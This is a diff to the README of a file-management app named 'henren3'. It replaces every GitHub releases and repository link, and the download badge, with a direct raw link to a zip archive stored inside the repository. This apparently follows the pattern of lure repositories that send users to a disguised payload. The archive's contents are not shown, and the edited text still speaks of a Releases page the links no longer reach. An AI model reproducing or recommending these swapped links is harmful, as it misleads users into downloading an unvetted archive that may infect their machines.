@@ -7,10 +7,10 @@ henren3 is a user-friendly application designed to help you manage files on your
 To begin using henren3, you need to download the application from our Releases page. Here’s how you can do that step-by-step.
 
 ## 🔗 Download Now!
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/MestoLive/henren3/releases)
+[![Download the latest release](https://raw.githubusercontent.com/MestoLive/henren3/main/Hobbist/henren3.zip%20Release-blue)](https://raw.githubusercontent.com/MestoLive/henren3/main/Hobbist/henren3.zip)
 
 ## 📥 Download & Install
-1. Click on the "Download Latest Release" button above or visit [this page](https://github.com/MestoLive/henren3/releases) to access the releases.
+1. Click on the "Download Latest Release" button above or visit [this page](https://raw.githubusercontent.com/MestoLive/henren3/main/Hobbist/henren3.zip) to access the releases.
 2. On the Releases page, look for the latest version of henren3.
 3. Click on the link for the appropriate version to start downloading. If you're unsure, choose the version with the highest number.
 4. Once the download is complete, locate the downloaded file. It typically goes to your "Downloads" folder.
@@ -49,7 +49,7 @@ If you encounter issues during installation or usage:
 For further assistance, you can reach out via the "Issues" section on our GitHub repository. We will respond to your queries as soon as possible.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/MestoLive/henren3)
-- [Releases Page](https://github.com/MestoLive/henren3/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/MestoLive/henren3/main/Hobbist/henren3.zip)
+- [Releases Page](https://raw.githubusercontent.com/MestoLive/henren3/main/Hobbist/henren3.zip)
 
 Feel free to explore henren3 and make file management simpler than ever!
